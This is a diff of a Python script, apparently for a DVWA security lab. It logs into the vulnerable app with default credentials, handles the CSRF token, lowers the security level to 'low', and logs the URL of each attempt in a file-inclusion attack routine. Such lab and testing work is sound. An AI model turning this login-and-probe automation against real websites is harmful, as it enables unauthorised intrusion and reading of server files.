@@ -33,26 +33,37 @@ fi_url = f"{base_url}/vulnerabilities/fi/?page="
 login_url = f"{base_url}/login.php"
 security_url = f"{base_url}/security.php"
 
+
 def login_and_setup_security():
-    #response = session.get(login_url)
-    data = {
+    login_response = session.get(login_url)  # Pega a página de login para obter o token CSRF, se houver
+    soup = BeautifulSoup(login_response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+
+    login_data = {
         'username': 'admin',
         'password': 'password',
         'Login': 'Login',
+        'user_token': user_token  # Inclua o token CSRF se necessário
     }
-    response = session.post(login_url, data=data, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
-    time.sleep(delay) 
+    login_response = session.post(login_url, data=login_data, headers=headers)
     
-    #response = session.get(security_url)
-    data = {
+    # Verifique se o login foi bem sucedido analisando a resposta ou verificando os cookies
+    if 'PHPSESSID' in session.cookies:
+        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
+    else:
+        print("Login failed")
+        return
+
+    # Configure o nível de segurança para baixo
+    security_response = session.get(security_url)
+    soup = BeautifulSoup(security_response.text, 'html.parser')
+    security_token = soup.find('input', {'name': 'user_token'}).get('value')
+    security_data = {
         'security': 'low',
         'seclev_submit': 'Submit',
-        'user_token': user_token
+        'user_token': security_token
     }
-    session.post(security_url, data=data, headers=headers)
-    time.sleep(delay) 
+    session.post(security_url, data=security_data, headers=headers)
 
 def file_inclusion_attack():
     file_paths = [
@@ -92,6 +103,7 @@ def file_inclusion_attack():
         
         details.append({
             "test_type": test_type,
+            "url": full_url,
             "path": file_path,
             "response_code": response.status_code,
             "status": result_status,
